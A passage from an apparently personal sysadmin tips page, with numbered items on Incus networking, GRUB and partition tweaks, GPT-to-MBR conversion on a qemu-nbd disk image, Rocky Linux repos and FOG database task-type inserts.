# 111(portmap) port (udp and tcp):
incus config device add fogincuschinese myport111 proxy listen=tcp:0.0.0.0:111 connect=tcp:127.0.0.1:111
incus config device add fogincuschinese myport111udp proxy listen=udp:0.0.0.0:111 connect=udp:127.0.0.1:111
# 67(dhcp) port (udp and tcp):, dhcp should not be configured
incus config device add fogincuschinese myport67 proxy listen=tcp:0.0.0.0:67 connect=tcp:127.0.0.1:67
incus config device add fogincuschinese myport67udp proxy listen=udp:0.0.0.0:67 connect=udp:127.0.0.1:67
</code></pre><h3 id=53-incus-network-create>53. incus network create</h3><p>via:</p><pre><code>incus network create foo ipv4.dhcp=false ipv6.dhcp=false ipv4.address=10.147.148.1/24
</code></pre><h3 id=54-incus-macvlan-create>54. incus macvlan create</h3><p>via:</p><pre><code># incus network create incusbr0 --type=macvlan parent=enp7s0
# incus network list
+----------+----------+---------+------+------+-------------+---------+---------+
|   NAME   |   TYPE   | MANAGED | IPV4 | IPV6 | DESCRIPTION | USED BY |  STATE  |
+----------+----------+---------+------+------+-------------+---------+---------+
| enp7s0   | physical | NO      |      |      |             | 1       |         |
+----------+----------+---------+------+------+-------------+---------+---------+
| incusbr0 | macvlan  | YES     |      |      |             | 0       | CREATED |
+----------+----------+---------+------+------+-------------+---------+---------+

</code></pre><h3 id=55-incus-instance-network>55. incus instance network</h3><p>via:</p><pre><code># cat /etc/systemd/network/eth0.network 
[Match]
Name=eth0

[Network]
Address=10.17.18.34/24
Gateway=10.17.18.1
DNS=223.5.5.5
</code></pre><h3 id=56-hide-partition>56. hide partition</h3><p>do:</p><pre><code>
HKEY_LOCAL_MACHINE\SYSTEM\MountedDevices
前面加#就隐藏
#\DosDevices\D:
重启就能看到效果。

这个安装器可隐藏指定区 http://bbs.wuyou.net/forum.php?m ... 466&amp;ordertype=1

</code></pre><h3 id=57-add-user-into-sudo>57. add user into sudo</h3><p>via:</p><pre><code>usermod -aG sudo xxx
</code></pre><h3 id=58-disable-debian-grub-picture>58. disable debian grub picture</h3><p>via:</p><pre><code>mv /usr/share/images/desktop-base/desktop-grub.png /usr/share/images/desktop-base/desktop-grub.png.bak
</code></pre><p>Edit the configuration of grub:</p><pre><code>GRUB_DEFAULT=&quot;Ventoy&quot;
GRUB_TIMEOUT_STYLE=hidden
GRUB_TIMEOUT=1
GRUB_DISTRIBUTOR=`lsb_release -i -s 2&gt; /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet&quot;
GRUB_CMDLINE_LINUX=&quot;&quot;
</code></pre><h3 id=59-blissos16-in-linuxloop>59. blissos16 in linuxloop</h3><p>via:</p><pre><code>sudo bash ~/linuxloopandroid -distro BlissOS -env 16/Gapps/Generic -dst /media/ntfs/linuxHHH/bliss16.img -s 40
</code></pre><h3 id=60-automatically-gptmbrfix>60. Automatically gpt/mbr/fix</h3><p><code>gpt->mbr</code> via:</p><pre><code>dash@ai:/media/sda/qcow2$ printf &quot;r\ng\nw\nY\n&quot;  | sudo gdisk /dev/nbd0
GPT fdisk (gdisk) version 1.0.8

Partition table scan:
  MBR: protective
  BSD: not present
  APM: not present
  GPT: present

Found valid GPT with protective MBR; using GPT.

Command (? for help): 
Recovery/transformation command (? for help): 
MBR command (? for help): 
Converted 4 partitions. Finalize and exit? (Y/N): GPT data structures destroyed! You may now partition the disk using fdisk or
other utilities.
dash@ai:/media/sda/qcow2$ sudo fdisk -l /dev/nbd0
Disk /dev/nbd0：80 GiB，85899345920 字节，167772160 个扇区
单元：扇区 / 1 * 512 = 512 字节
扇区大小(逻辑/物理)：512 字节 / 512 字节
I/O 大小(最小/最佳)：512 字节 / 512 字节
磁盘标签类型：dos
磁盘标识符：0x00000000

设备        启动      起点      末尾      扇区  大小 Id 类型
/dev/nbd0p1           2048    206847    204800  100M ef EFI (FAT-12/16/32)
/dev/nbd0p2         206848    239615     32768   16M  c W95 FAT32 (LBA)
/dev/nbd0p3         239616 166560255 166320640 79.3G  7 HPFS/NTFS/exFAT
/dev/nbd0p4      166560256 167770623   1210368  591M 27 隐藏的 NTFS WinRE

</code></pre><p>Then mark <code>/dev/nbd0p3</code> as bootable:</p><p>Whole scripts:</p><pre><code>convert_to_mbr.sh
sudo qemu-nbd --connect=/dev/nbd0 /media/sda/qcow2/winuefi_to_mbr.qcow2 
echo &quot;############### 0. Show origin items&quot;
sudo fdisk -l
sleep 3
echo &quot;############### 1. Convert from gpt to mbr&quot;
printf &quot;r\ng\nw\nY\n&quot;  | sudo gdisk /dev/nbd0
echo &quot;############### 2. Set bootable flag to disk&quot;
printf &quot;a\n3\nw\n&quot;  | sudo fdisk /dev/nbd0
echo &quot;############### 3. List modified items&quot;
sudo fdisk -l
sudo qemu-nbd --disconnect /dev/nbd0
echo &quot;############### 4. Now start machine for fixing bootable in winPE&quot;

</code></pre><h3 id=61-install-gnome-flashback>61. Install gnome flashback</h3><p>via:</p><pre><code>$ sudo apt install gnome-session-flashback
</code></pre><h3 id=62-buildroot-chinese>62. buildroot chinese</h3><p>via:</p><pre><code>在buildroot目录下运行make menuconfig 命令，在Build options–&gt;Mirrors and Download locations 下设置国内源：

BACKUP_SITE=&quot;https://mirrors.lzu.edu.cn/buildroot/&quot;
KERNEL_MIRROR=&quot;https://mirror.bjtu.edu.cn/kernel/&quot;
GNU_MIRROR=&quot;http://mirrors.nju.edu.cn/gnu/&quot;
LUAROCKS_MIRROR=&quot;https://luarocks.cn&quot;
CPAN_MIRROR=&quot;http://mirrors.nju.edu.cn/CPAN/&quot;
</code></pre><p><code>BACKUP_SITE</code> could adjust to lzu.edu.cn repository</p><p><img src=/images/2024_05_20_19_22_20_777x320.jpg alt=/images/2024_05_20_19_22_20_777x320.jpg></p><h3 id=63-xz-for-initram>63. xz for initram</h3><p>xz via following command:</p><pre><code>xz -C crc32 -z -c init &gt; init.xz
</code></pre><h3 id=64-python-issue>64. python issue</h3><p>solved via:</p><pre><code>[test@minirocky92 ~]$ python
Python 3.9.16 (main, Dec  8 2022, 00:00:00) 
[GCC 11.3.1 20221121 (Red Hat 11.3.1-4)] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; quit()
[test@minirocky92 ~]$ sudo alternatives --install /usr/bin/python python /usr/bin/python3
python3     python3.11  python3.9   
[test@minirocky92 ~]$ sudo alternatives --install /usr/bin/python python /usr/bin/python3.9 50
[sudo] password for test: 
[test@minirocky92 ~]$ sudo alternatives --install /usr/bin/python python /usr/bin/python3.11 60
[test@minirocky92 ~]$ sudo alternatives --config python

There are 2 programs which provide 'python'.

  Selection    Command
-----------------------------------------------
   1           /usr/bin/python3.9
*+ 2           /usr/bin/python3.11

Enter to keep the current selection[+], or type selection number: 2
[test@minirocky92 ~]$ python
Python 3.11.7 (main, Jan 22 2024, 00:00:00) [GCC 11.4.1 20231218 (Red Hat 11.4.1-3)] on linux
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; quit()
</code></pre><h3 id=64-rocklinux-use-cd-rom>64. rocklinux use cd-rom</h3><p>via:</p><pre><code>$ mount iso /mnt8
$ cat /etc/yum.repos.d/local.repo 
[local]
name=local
baseurl=file:///mnt8/BaseOS/
enabled=1
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release
#gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-Rocky-9

[AppStream]
name=AppStream Packages Rocky Linux 9
metadata_expire=-1
gpgcheck=1
enabled=1
baseurl=file:///mnt8/AppStream/
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release
$ yum install -y firefox xorg-x11-xauth
</code></pre><h3 id=65-fog-datebase-tips>65. fog datebase tips</h3><p>recording tips:</p><pre><code># mysql -u fogmaster -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2094
Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; use fog
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [fog]&gt; select * from taskTypes;
......
MariaDB [fog]&gt; update taskTypes set ttKernelArgs='mode=switchsystem nextsystem=fetchvhdwin10' where ttId='32'
    -&gt; ;
Query OK, 1 row affected (0.005 sec)
Rows matched: 1  Changed: 1  Warnings: 0

MariaDB [fog]&gt; update taskTypes set ttKernelArgs='mode=switchsystem nextsystem=downloadvhdwin10' where ttId='33';
Query OK, 1 row affected (0.006 sec)
Rows matched: 1  Changed: 1  Warnings: 0

</code></pre><p>Insert sentences:</p><pre><code> INSERT INTO taskTypes (ttID, ttName, ttDescription, ttIcon, ttKernel, ttKernelArgs, ttType, ttIsAdvanced, ttIsAccess, ttInitrd) VALUES ('32', 'Fetch Win10', 'Fetch Win10 vhd to nfs server', 'upload', '', 'mode=switchsystem nextsystem=fetchvhdwin10', 'fog', '1', 'both', '');
 INSERT INTO taskTypes (ttID, ttName, ttDescription, ttIcon, ttKernel, ttKernelArgs, ttType, ttIsAdvanced, ttIsAccess, ttInitrd) VALUES ('33', 'Sync Win10', 'Sync Win10 vhd from nfs server', 'download', '', 'mode=switchsystem nextsystem=downloadvhdwin10', 'fog', '1', 'both', '');

</code></pre></div></div><script src=http://purplepalmdash.github.io/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script></body></html>